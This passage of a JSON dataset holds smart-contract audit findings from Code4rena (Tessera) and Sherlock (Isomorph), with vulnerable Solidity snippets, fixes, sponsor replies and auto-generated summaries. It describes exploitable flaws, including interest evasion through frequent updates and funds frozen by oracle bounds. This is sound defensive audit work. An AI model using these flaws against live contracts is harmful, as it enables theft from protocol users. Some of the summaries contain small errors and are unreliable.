      "content": "\n<https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L265>\n\n<https://github.com/code-423n4/2022-12-tessera/blob/1e408ebc1c4fdcc72678ea7f21a94d38855ccc0b/src/modules/GroupBuy.sol#L283>\n\n### Impact\n\nBoth usages of `call` do not check if the transfer of ETH was succesful:\n\n```solidity\npayable(msg.sender).call{value: contribution}(\"\");\n...\npayable(msg.sender).call{value: balance}(\"\");\n```\n\nThis can become very problematic when the recipient is a smart contract that reverts (for instance, temporarily) in its `receive` function. Then, `GroupBuy` still assumes that this ETH was transferred out and sets the balance to 0 or deletes `userContributions[_poolId][msg.sender]`, although no ETH was transferred. This leads to a loss of funds for the recipient.\n\n### Proof Of Concept\n\nWe assume that the recipient is a smart contract that performs some logic in its `receive` function. For instance, it can be a nice feature for some people to automatically convert all incoming ETH into another token using an AMM. However, it can happen that the used AMM has too little liquidity at the moment or the slippage of a swap would be too high, leading to a revert in the receing contract. In such a scenario, the `GroupBuy` contract still thinks that the call was succesful, leading to lost funds for the recipient.\n\n### Recommended Mitigation Steps\n\n`require` that the call was successful.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/6#issuecomment-1358704150):**\n > Keeping as High severity because of valid use case and resulting loss of funds if the receiving contract reverts, but the tx doesn't.\n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/6#issuecomment-1404416518):**\n > https://github.com/fractional-company/modular-fractional/pull/204\n >\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/39), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/20), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/2).\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the GroupBuy smart contract. The issue is that the contract does not check if the transfer of ETH was successful when calling the `call` function. This can lead to a loss of funds for the recipient if the recipient is a smart contract that reverts in its `receive` function. A proof of concept is given, where the recipient is a smart contract that performs some logic in its `receive` function, such as converting ETH to another token. If the conversion fails, the GroupBuy contract still assumes that the call was successful, leading to lost funds for the recipient. The recommended mitigation step is to `require` that the call was successful.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/6",
      "tags": [],
      "finders": [
        "Lambda",
        "Trust  IllIllI"
      ]
    },
    {
      "id": "5705",
      "title": "M-13: All collateral in Velodrome vault will be permantly locked if either asset in liquidity pair stays outside of min/max price",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/70 \n\n## Found by \nclems4ever, 0x52\n\n## Summary\n\nThe oracles used have a built in safeguard to revert the transaction if the queried asset is outside of a defined price range. The issue with this is that every vault interaction requires the underlying collateral to be valued. If one of the assets in the pair goes outside it's immutable range then the entire vault will be frozen and all collateral will be permanently stuck.\n\n## Vulnerability Detail\n\n    function getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256 ) {\n        (\n            /*uint80 roundID*/,\n            int signedPrice,\n            /*uint startedAt*/,\n            uint timeStamp,\n            /*uint80 answeredInRound*/\n        ) = _priceFeed.latestRoundData();\n        //check for Chainlink oracle deviancies, force a revert if any are present. Helps prevent a LUNA like issue\n        require(signedPrice > 0, \"Negative Oracle Price\");\n        require(timeStamp >= block.timestamp - HEARTBEAT_TIME , \"Stale pricefeed\");\n\n        //@audit revert if price is outside of immutable bounds\n        require(signedPrice < _maxPrice, \"Upper price bound breached\");\n        require(signedPrice > _minPrice, \"Lower price bound breached\");\n        uint256 price = uint256(signedPrice);\n        return price;\n    }\n\nThe lines above are called each time and asset is priced. If the oracle returns outside of the predefined range then the transaction will revert.\n\n        uint256 outstandingisoUSD = isoUSDdebt - _USDToVault;\n        //@audit contract prices withdraw collateral\n        uint256 colInUSD = _calculateProposedReturnedCapital(_collateralAddress, _loanNFTs, _partialPercentage);\n        if(outstandingisoUSD >= TENTH_OF_CENT){ //ignore debts less than $0.001\n            uint256 collateralLeft = totalCollateralValue(_collateralAddress, msg.sender) - colInUSD;\n            uint256 borrowMargin = (outstandingisoUSD * minOpeningMargin) / LOAN_SCALE;\n            require(collateralLeft > borrowMargin , \"Remaining debt fails to meet minimum margin!\");\n        }\n\nWhen closing a loan the vault attempts to price the users collateral. Since this is the only way for a user to remove collateral is to call closeLoan, if the price of either asset in the LP goes outside of its bounds then all user deposits will be lost. \n\n## Impact\n\nEntire vault will be frozen and all collateral will be permanently stuck\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Velo.sol#L527-L587\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIf a user is closing their entire loan then there is no need to check the value of the withdraw collateral because there is no longer any debt to collateralize. Move the check inside the inequality to allow the closeLoan to always function:\n\n        uint256 outstandingisoUSD = isoUSDdebt - _USDToVault;\n    -   uint256 colInUSD = _calculateProposedReturnedCapital(_collateralAddress, _loanNFTs, _partialPercentage);\n    +   uint256 colInUSD;\n        if(outstandingisoUSD >= TENTH_OF_CENT){ //ignore debts less than $0.001\n    +       uint256 colInUSD = _calculateProposedReturnedCapital(_collateralAddress, _loanNFTs, _partialPercentage);\n            uint256 collateralLeft = totalCollateralValue(_collateralAddress, msg.sender) - colInUSD;\n            uint256 borrowMargin = (outstandingisoUSD * minOpeningMargin) / LOAN_SCALE;\n            require(collateralLeft > borrowMargin , \"Remaining debt fails to meet minimum margin!\");\n        }\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. \n\nAlso by fixing issue #145 and refreshing the minPrice and maxPrice on each call we will reduce the likelihood of a price getting stuck outside of the aggregator price range.\n\n\n\n\n**kree-dotcom**\n\nProposed solution no longer works as the solution to issue #161 changed line 553 in `Vault_Velo.sol` to `if((outstandingisoUSD > 0) && (colInUSD > 0)){ ` meaning that the calculation of colInUSD must occur before entering the if clause. \n\nHowever with issue #145 fixed this problem is less terminal as now we update the minPrice and maxPrice with each call. \nWe then have two situations in which the minPrice or maxPrice protection is triggered:\n\n1.  Slow approach, i.e. like ETH reaching $1,000,000 over the span of a year. It is likely that Chainlink would update the aggregator maxPrice before it was reached and so this situation does not pose a problem.\n2.  Flash crash, a collateral is hacked or manipulated so that it drops below the minPrice faster than Chainlink can react and so the collateral is now stuck for our system. While this situation is not solved the assets backing the loan are now likely worthless anyway. This does not address the situation when the price rises suddenly. In that case the collateral will become inaccessible for a short while, it is assumed that if the price persists Chainlink would then alter the maxPrice and so collateral would become accessible again.\n\nTherefore this has become a \"won't fix\" issue",
      "summary": "\nThis bug report is about an issue found in the Isomorph project, which is a DeFi protocol. The issue is that the oracles used have a built in safeguard to revert the transaction if the queried asset is outside of a defined price range. However, if one of the assets in the pair goes outside it's immutable range then the entire vault will be frozen and all collateral will be permanently stuck. This is because when closing a loan, the vault attempts to price the users collateral and since this is the only way for a user to remove collateral is to call closeLoan, if the price of either asset in the LP goes outside of its bounds then all user deposits will be lost. \n\nThe code snippet provided in the report is from the Vault_Velo.sol file, which is related to the issue. The tool used to find the issue was manual review. The recommendation provided is to move the check inside the inequality to allow the closeLoan to always function. It was also discussed that with issue #145 fixed, the problem is less terminal as now the minPrice and maxPrice are updated with each call. Therefore, this issue has been marked as a \"won't fix\".",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/70",
      "tags": [
        "DOS"
      ],
      "finders": [
        "clems4ever",
        "0x52"
      ]
    },
    {
      "id": "5704",
      "title": "M-12: Vault_Synths.sol code does not consider protocol exchange fee when evaluating the Collateral worth",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/120 \n\n## Found by \nctf\\_sec\n\n## Summary\n\nVault_Synths.sol code does not consider protocol fee.\n\n## Vulnerability Detail\n\nIf we look into the good-written documentation:\n\nhttps://github.com/kree-dotcom/isomorph/blob/789338c8979ab75b8187781a2500908bb26dcdea/docs/Vault_Lyra.md#getwithdrawalfee\n\nI want to quote:\n\n> Because the withdrawalFee of a lyra LP pool can vary we must fetch it each time it is needed to ensure we use an accurate value. LP tokens are devalued by this as a safety measure as any liquidation would include selling the collateral and so should factor in that cost to ensure it is profitable.\n\nIn Vault_Lyra.sol, when calculating the collateral of the LP token, the fee is taken into consideration.\n\n```solidity\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n     //The LiquidityPool associated with the LP Token is used for pricing\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    //we have already checked for stale greeks so here we call the basic price function.\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();          \n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue  = (_amount * tokenPrice) / LOAN_SCALE;\n    //we remove the Liquidity Pool withdrawalFee \n    //as there's no way to remove the LP position without paying this.\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE- withdrawalFee)/LOAN_SCALE;\n    return(USDValueAfterFee);\n}\n```\n\nThis is not the case for Vault_Synths.sol, the underlying token also charge exchange fee, but this fee is not reflected when evaluating the Collateral worth.\n\nhttps://docs.synthetix.io/incentives/#exchange-fees\n\n> Exchange fees are generated whenever a user exchanges one synthetic asset (Synth) for another through [Synthetix.Exchange](https://synthetix.exchange/). Fees are typically between 10-100 bps (0.1%-1%), though usually 30 bps, and when generated are sent to the fee pool, where it is available to be claimed proportionally by SNX stakers each week.\n\nIf we go to https://synthetix.io/synths,\n\nwe can see that the sETH token charges 0.25%, the sBTC token charges 0.25%, the sUSD charges 0% fee, but this does not ensure this fee rate will not change in the future.\n\n## Impact\n\nThe collateral may be overvalued because the exchange does not count when evaluating the Collateral worth and result in bad debt which makes the project insolvent.\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWe recommend the project consider protocol exchange fee when evaluating the Collateral worth in Vault_Synths.sol \n\nhttps://github.com/Synthetixio/synthetix/blob/develop/contracts/SystemSettings.sol#L362\n\nPrecisely when the exchange fee is updated, the fee is reflected in the collateral worth.\n\n```solidity\n    function setExchangeFeeRateForSynths(bytes32[] calldata synthKeys, uint256[] calldata exchangeFeeRates)\n        external\n        onlyOwner\n    {\n        flexibleStorage().setExchangeFeeRateForSynths(SETTING_EXCHANGE_FEE_RATE, synthKeys, exchangeFeeRates);\n        for (uint i = 0; i < synthKeys.length; i++) {\n            emit ExchangeFeeUpdated(synthKeys[i], exchangeFeeRates[i]);\n        }\n    }\n\n    /// @notice Set exchange dynamic fee threshold constant in decimal ratio\n    /// @param threshold The exchange dynamic fee threshold\n    /// @return uint threshold constant\n    function setExchangeDynamicFeeThreshold(uint threshold) external onlyOwner {\n        require(threshold != 0, \"Threshold cannot be 0\");\n\n        flexibleStorage().setUIntValue(SETTING_CONTRACT_NAME, SETTING_EXCHANGE_DYNAMIC_FEE_THRESHOLD, threshold);\n\n        emit ExchangeDynamicFeeThresholdUpdated(threshold);\n    }\n```\n\n## Discussion\n\n**kree-dotcom**\n\nSPonsor confirmed, will fix",
      "summary": "\nThis bug report is about an issue in the Vault_Synths.sol code that does not consider the protocol exchange fee when evaluating the Collateral worth. The issue was found by ctf_sec and was reported on the Github page of Sherlock Audit.\n\nThe vulnerability detail explains that the LiquidityPool associated with the LP token is used for pricing in Vault_Lyra.sol and that the withdrawal fee is taken into consideration. However, this is not the case for Vault_Synths.sol, where the underlying token also charges an exchange fee, but this fee is not reflected when evaluating the Collateral worth. This could result in bad debt, making the project insolvent.\n\nThe recommendation is for the project to consider the protocol exchange fee when evaluating the Collateral worth in Vault_Synths.sol. This should be done by updating the exchange fee rate when it is changed and setting an exchange dynamic fee threshold constant in decimal ratio.\n\nThe sponsor of the report has confirmed and promised to fix the issue.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/120",
      "tags": [
        "External Contract"
      ],
      "finders": [
        "ctf\\_sec"
      ]
    },
    {
      "id": "5703",
      "title": "M-11: priceLiquidity() may not work if PriceFeed.aggregator() is updated",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/145 \n\n## Found by \ncccz\n\n## Summary\npriceLiquidity() may not work if PriceFeed.aggregator() is updated\n## Vulnerability Detail\nIn the constructor of the DepositReceipt_* contract, the value of minAnswer/maxAnswer in priceFeed.aggregator() is obtained and assigned to *MinPrice/*MaxPrice as the maximum/minimum price limit when calling the getOraclePrice function in priceLiquidity, and *MinPrice/*MaxPrice can not change.\n```solidity\n        IAccessControlledOffchainAggregator  aggregator = IAccessControlledOffchainAggregator(priceFeed.aggregator());\n        //fetch the pricefeeds hard limits so we can be aware if these have been reached.\n        tokenMinPrice = aggregator.minAnswer();\n        tokenMaxPrice = aggregator.maxAnswer();\n...\n            uint256 oraclePrice = getOraclePrice(priceFeed, tokenMaxPrice, tokenMinPrice);\n...\n    function getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256 ) {\n        (\n            /*uint80 roundID*/,\n            int signedPrice,\n            /*uint startedAt*/,\n            uint timeStamp,\n            /*uint80 answeredInRound*/\n        ) = _priceFeed.latestRoundData();\n        //check for Chainlink oracle deviancies, force a revert if any are present. Helps prevent a LUNA like issue\n        require(signedPrice > 0, \"Negative Oracle Price\");\n        require(timeStamp >= block.timestamp - HEARTBEAT_TIME , \"Stale pricefeed\");\n        require(signedPrice < _maxPrice, \"Upper price bound breached\");\n        require(signedPrice > _minPrice, \"Lower price bound breached\");\n```\nBut in the priceFeed contract, the address of the aggregator can be changed by the owner, which may cause the value of minAnswer/maxAnswer to change, and the price limit in the DepositReceipt_* contract to be invalid, and priceLiquidity() can not work.\n```solidity\n  function confirmAggregator(address _aggregator)\n    external\n    onlyOwner()\n  {\n    require(_aggregator == address(proposedAggregator), \"Invalid proposed aggregator\");\n    delete proposedAggregator;\n    setAggregator(_aggregator);\n  }\n\n\n  /*\n   * Internal\n   */\n\n  function setAggregator(address _aggregator)\n    internal\n  {\n    uint16 id = currentPhase.id + 1;\n    currentPhase = Phase(id, AggregatorV2V3Interface(_aggregator));\n    phaseAggregators[id] = AggregatorV2V3Interface(_aggregator);\n  }\n  ...\n    function aggregator()\n    external\n    view\n    returns (address)\n  {\n    return address(currentPhase.aggregator);\n  }\n```\n## Impact\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_ETH.sol#L66-L80\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L60-L64\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_ETH.sol#L107-L109\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_ETH.sol#L134-L135\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L90-L91\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L113-L114\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_Base.sol#L164-L176\nhttps://etherscan.io/address/0xc7de7f4d4C9c991fF62a07D18b3E31e349833A18#code\nhttps://etherscan.io/address/0x72002129A3834d63C57d157DDF069deE37b08F24#code\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider getting latest priceFeed.aggregator().minAnswer()/maxAnswer() in priceLiquidity()\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. \n\nChainlink documents state: \"you can call functions on the aggregator directly, but it is a best practice to use the [AggregatorV3Interface](https://docs.chain.link/data-feeds/price-feeds/api-reference#aggregatorv3interface) to run functions on the proxy instead so that changes to the aggregator do not affect your application. Read the aggregator contract only if you need functions that are not available in the proxy.\"\n\nSo the auditor is right that we should not assume the AccessControlledOffchainAggregator is static. We will move these calls to occur on every call rather than in setup.\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/58b8f3e14b416630971b7b17b500bbe22d2016aa\n\nNote there are two fixes in this commit relating to the priceLiquidity function. the other issue is #72 , the code for these changes doesn't overlap so should be clear, please ask me if it is not.",
      "summary": "\nThis bug report was found by cccz and is related to the priceLiquidity() function not working if the PriceFeed.aggregator() is updated. The issue is that in the DepositReceipt_* contract, the value of minAnswer/maxAnswer in priceFeed.aggregator() is obtained and assigned to *MinPrice/*MaxPrice as the maximum/minimum price limit when calling the getOraclePrice function in priceLiquidity, and *MinPrice/*MaxPrice can not change. However, in the priceFeed contract, the address of the aggregator can be changed by the owner, which may cause the value of minAnswer/maxAnswer to change, and the price limit in the DepositReceipt_* contract to be invalid, and priceLiquidity() can not work.\n\nThe proposed solution is to consider getting latest priceFeed.aggregator().minAnswer()/maxAnswer() in priceLiquidity(). The code snippet and tools used for this bug report can be found in the original report. The sponsor has confirmed the issue and fixed it in the commit https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/58b8f3e14b416630971b7b17b500bbe22d2016aa.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/145",
      "tags": [
        "Change Validation"
      ],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "5702",
      "title": "M-10: Vault_Base_ERC20#_updateVirtualPrice calculates interest incorrectly if updated frequently",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/158 \n\n## Found by \nbin2chen, HollaDieWaldfee, Jeiwan, hansfriese, libratus, rvierdiiev, wagmi, 0x52, KingNFT, Atarpara\n\n## Summary\n\nUpdating the virtual price of an asset happens in discrete increments of 3 minutes. This is done to reduce the chance of DOS loops. The issue is that it updates the time to an incorrect timestamp. It should update to the truncated 3 minute interval but instead updates to the current timestamp. The result is that the interest calculation can be abused to lower effective interest rate.\n\n## Vulnerability Detail\n\n    function _updateVirtualPrice(uint256 _currentBlockTime, address _collateralAddress) internal { \n        (   ,\n            ,\n            ,\n            uint256 interestPer3Min,\n            uint256 lastUpdateTime,\n            uint256 virtualPrice,\n\n        ) = _getCollateral(_collateralAddress);\n        uint256 timeDelta = _currentBlockTime - lastUpdateTime;\n        //exit gracefully if two users call the function for the same collateral in the same 3min period\n        //@audit increments \n        uint256 threeMinuteDelta = timeDelta / 180; \n        if(threeMinuteDelta > 0) {\n            for (uint256 i = 0; i < threeMinuteDelta; i++ ){\n            virtualPrice = (virtualPrice * interestPer3Min) / LOAN_SCALE; \n            }\n            collateralBook.vaultUpdateVirtualPriceAndTime(_collateralAddress, virtualPrice, _currentBlockTime);\n        }\n    }\n\n_updateVirtualPrice is used to update the interest calculations for the specified collateral and is always called with block.timestamp. Due to truncation threeMinuteDelta is always rounded down, that is if there has been 1.99 3-minute intervals it will truncate to 1. The issue is that in the collateralBook#vaultUpdateVirtualPriceAndTime subcall the time is updated to block.timestamp (_currentBlockTime). \n\nExample:\nlastUpdateTime = 1000 and block.timestamp (_currentBlockTime) = 1359.\n\ntimeDelta = 1359 - 1000 = 359\n\nthreeMinuteDelta = 359 / 180 = 1\n\nThis updates the interest by only as single increment but pushes the new time forward 359 seconds. When called again it will use 1359 as lastUpdateTime which means that 179 seconds worth of interest have been permanently lost. Users with large loan positions could abuse this to effectively halve their interest accumulation. Given how cheap optimism transactions are it is highly likely this could be exploited profitably with a bot.\n\n## Impact\n\nInterest calculations will be incorrect if they are updated frequently, which can be abused by users with large amounts of debt to halve their accumulated interest\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Base_ERC20.sol#L203-L221\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBefore updating the interest time it should first truncate it to the closest 3-minute interval:\n\n        if(threeMinuteDelta > 0) {\n            for (uint256 i = 0; i < threeMinuteDelta; i++ ){\n                virtualPrice = (virtualPrice * interestPer3Min) / LOAN_SCALE; \n            }\n    +       _currentBlockTime = (_currentBlockTime / 180) * 180;\n            collateralBook.vaultUpdateVirtualPriceAndTime(_collateralAddress, virtualPrice, _currentBlockTime);\n        }\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix.\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/isomorph/commit/ae410496c024af5b061cf85997f225ae46fd56e6",
      "summary": "\nIssue M-10 is a bug in the Vault_Base_ERC20#_updateVirtualPrice function found by multiple users on the Sherlock Audit Github. The issue is that the function updates the time to an incorrect timestamp, which can be abused to lower the effective interest rate. \n\nThe issue is that when _updateVirtualPrice is called with block.timestamp, due to truncation threeMinuteDelta is always rounded down. This means that if there has been 1.99 3-minute intervals it will truncate to 1, updating the interest by only a single increment but pushing the new time forward 359 seconds. When called again it will use the last timestamp as the starting point, so 179 seconds worth of interest have been permanently lost. \n\nThe impact of this bug is that interest calculations will be incorrect if they are updated frequently, which can be abused by users with large amounts of debt to halve their accumulated interest. To fix this, it is recommended that the code should truncate the time to the closest 3-minute interval before updating the interest. The bug has been fixed and the code snippet can be found on the Sherlock Audit Github.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/158",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "HollaDieWaldfee",
        "0x52",
        "Jeiwan",
        "bin2chen",
        "KingNFT",
        "Atarpara",
        "hansfriese",
        "wagmi",
        "rvierdiiev",
        "libratus"
      ]
    },
    {
      "id": "5701",
      "title": "M-9: Bad debt may persist even after complete liquidation in Velo Vault due to truncation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/174 \n\n## Found by \n0x52\n\n## Summary\n\nWhen liquidating a user, if all their collateral is taken but it is not valuable enough to repay the entire loan they would be left with remaining debt. This is what is known as bad debt because there is no collateral left to take and the user has no obligation to pay it back. When this occurs, the vault will forgive the user's debts, clearing the bad debt. The problem is that the valuations are calculated in two different ways which can lead to truncation issue that completely liquidates a user but doesn't clear their bad debt.\n\n## Vulnerability Detail\n\n            uint256 totalUserCollateral = totalCollateralValue(_collateralAddress, _loanHolder);\n            uint256 proposedLiquidationAmount;\n            { //scope block for liquidationAmount due to stack too deep\n                uint256 liquidationAmount = viewLiquidatableAmount(totalUserCollateral, 1 ether, isoUSDBorrowed, liquidatableMargin);\n                require(liquidationAmount > 0 , \"Loan not liquidatable\");\n                proposedLiquidationAmount = _calculateProposedReturnedCapital(_collateralAddress, _loanNFTs, _partialPercentage);\n                require(proposedLiquidationAmount <= liquidationAmount, \"excessive liquidation suggested\");\n            }\n            uint256 isoUSDreturning = proposedLiquidationAmount*LIQUIDATION_RETURN/LOAN_SCALE;\n            if(proposedLiquidationAmount >= totalUserCollateral){\n                //@audit bad debt cleared here\n            }\n\nThe primary check before clearing bad debt is to check if `proposedLiquidationAmount >= totalUserCollateral`. The purpose of this check is to confirm that all of the user's collateral is being liquidated. The issue is that each value is calculated differently.\n\n    function totalCollateralValue(address _collateralAddress, address _owner) public view returns(uint256){\n        NFTids memory userNFTs = loanNFTids[_collateralAddress][_owner];\n        IDepositReceipt depositReceipt = IDepositReceipt(_collateralAddress);\n        //slither-disable-next-line uninitialized-local-variables\n        uint256 totalPooledTokens;\n        for(uint256 i =0; i < NFT_LIMIT; i++){\n            //check if each slot contains an NFT\n            if (userNFTs.ids[i] != 0){\n                totalPooledTokens += depositReceipt.pooledTokens(userNFTs.ids[i]);\n            }\n        }\n        return(depositReceipt.priceLiquidity(totalPooledTokens));\n    }\n\n`totalCollateralValue` it used to calculate `totalUserCollateral`. In this method the pooled tokens are summed across all NFT's then they are priced. This means that the value of the liquidity is truncated exactly once.\n\n    function _calculateProposedReturnedCapital(\n        address _collateralAddress, \n        CollateralNFTs calldata _loanNFTs, \n        uint256 _partialPercentage\n        ) internal view returns(uint256){\n        //slither-disable-next-line uninitialized-local-variables\n        uint256 proposedLiquidationAmount;\n        require(_partialPercentage <= LOAN_SCALE, \"partialPercentage greater than 100%\");\n        for(uint256 i = 0; i < NFT_LIMIT; i++){\n                if(_loanNFTs.slots[i] < NFT_LIMIT){\n                    if((i == NFT_LIMIT -1) && (_partialPercentage > 0) && (_partialPercentage < LOAN_SCALE) ){\n                        //final slot is NFT that will be split if necessary\n                        proposedLiquidationAmount += \n                                                    (( _priceCollateral(IDepositReceipt(_collateralAddress), _loanNFTs.ids[i]) \n                                                    *_partialPercentage)/ LOAN_SCALE);\n                    } \n                    else {\n                        proposedLiquidationAmount += _priceCollateral(IDepositReceipt(_collateralAddress), _loanNFTs.ids[i]);\n                    }\n                }\n            }\n        return proposedLiquidationAmount;\n    }\n\n`_calculateProposedReturnedCapital` is used to calculate `proposedLiquidationAmount`. The key difference is that each NFT is priced individually. The result is that the value is truncated up to NFT_LIMIT times. This can lead to proposedLiquidationAmount being less than totalUserCollateral even if all user collateral is being liquidated.\n\nExample:\nUser A has 2 NFTs. They are valued as follows assuming no truncation: 10.6 and 10.7. When calculating via `totalCollateralValue` they will be summed before they are truncated while in `_calculateProposedReturnedCapital` they will be truncated before they are summed.\n\ntotalCollateralValue:\n10.6 + 10.7 = 21.3 => 21 (truncated)\n\n_calculateProposedReturnedCapital:\n10.6 => 10 (truncated)\n10.7 => 10 (truncated)\n\n10 + 10 = 20 \n\nAs shown above when using the exact same inputs into our two different functions the final answer is different. In a scenario like this, even though all collateral is taken from the user, their bad debt won't be cleared. \n\n## Impact\n\nBad debt will not be cleared in some liquidation scenarios\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Velo.sol#L593-L619\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`_calculateProposedReturnedCapital` should be changed to be similar to `totalCollateralValue`, summing all pooled tokens before pricing:\n\n        function _calculateProposedReturnedCapital(\n            address _collateralAddress, \n            CollateralNFTs calldata _loanNFTs, \n            uint256 _partialPercentage\n        ) internal view returns(uint256) {\n    +       IDepositReceipt depositReceipt = IDepositReceipt(_collateralAddress);\n            //slither-disable-next-line uninitialized-local-variables\n    +       uint256 totalPooledTokens\n    -       uint256 proposedLiquidationAmount;\n            require(_partialPercentage <= LOAN_SCALE, \"partialPercentage greater than 100%\");\n            for(uint256 i = 0; i < NFT_LIMIT; i++){\n                if(_loanNFTs.slots[i] < NFT_LIMIT){\n                    if((i == NFT_LIMIT -1) && (_partialPercentage > 0) && (_partialPercentage < LOAN_SCALE) ){\n                        //final slot is NFT that will be split if necessary\n    +                   totalPooledTokens += ((depositReceipt.pooledTokens(userNFTs.ids[i]) * _partialPercentage) / LOAN_SCALE);\n    -                   proposedLiquidationAmount += \n    -                                            (( _priceCollateral(IDepositReceipt(_collateralAddress), _loanNFTs.ids[i]) \n    -                                           *_partialPercentage)/ LOAN_SCALE);\n                    } \n                    else{\n    +                   totalPooledTokens += depositReceipt.pooledTokens(userNFTs.ids[i]);\n    -                   proposedLiquidationAmount += _priceCollateral(IDepositReceipt(_collateralAddress), _loanNFTs.ids[i]);\n                    }\n                }\n            }\n    +       return(depositReceipt.priceLiquidity(totalPooledTokens));\n    -       return proposedLiquidationAmount;\n        }\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, fixed https://github.com/kree-dotcom/isomorph/commit/6c0bd26136ff4b33f23437551e22b1066156995b\n\nSorry there were some errors I've corrected in the above commit https://github.com/kree-dotcom/isomorph/commit/4322e27fa3e61f1515ba8e88d275676c7b9ed915",
      "summary": "\nThis bug report is about an issue found in Velo Vault, a platform for trading non-fungible tokens. The issue is that when liquidating a user, if all their collateral is taken but it is not valuable enough to repay the entire loan they would be left with remaining debt. This is known as bad debt because there is no collateral left to take and the user has no obligation to pay it back. The problem is that the valuations are calculated in two different ways which can lead to truncation issue that completely liquidates a user but doesn't clear their bad debt. \n\nThe primary check before clearing bad debt is to check if `proposedLiquidationAmount >= totalUserCollateral`. The purpose of this check is to confirm that all of the user's collateral is being liquidated. The issue is that each value is calculated differently. `totalCollateralValue` it used to calculate `totalUserCollateral`. In this method the pooled tokens are summed across all NFT's then they are priced. This means that the value of the liquidity is truncated exactly once. `_calculateProposedReturnedCapital` is used to calculate `proposedLiquidationAmount`. The key difference is that each NFT is priced individually. The result is that the value is truncated up to NFT_LIMIT times. This can lead to proposedLiquidationAmount being less than totalUserCollateral even if all user collateral is being liquidated.\n\nThe impact of this bug is that bad debt will not be cleared in some liquidation scenarios. The code snippet responsible for this bug can be found at https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Velo.sol#L593-L619. The bug was discovered through manual review. \n\nThe recommended solution is to 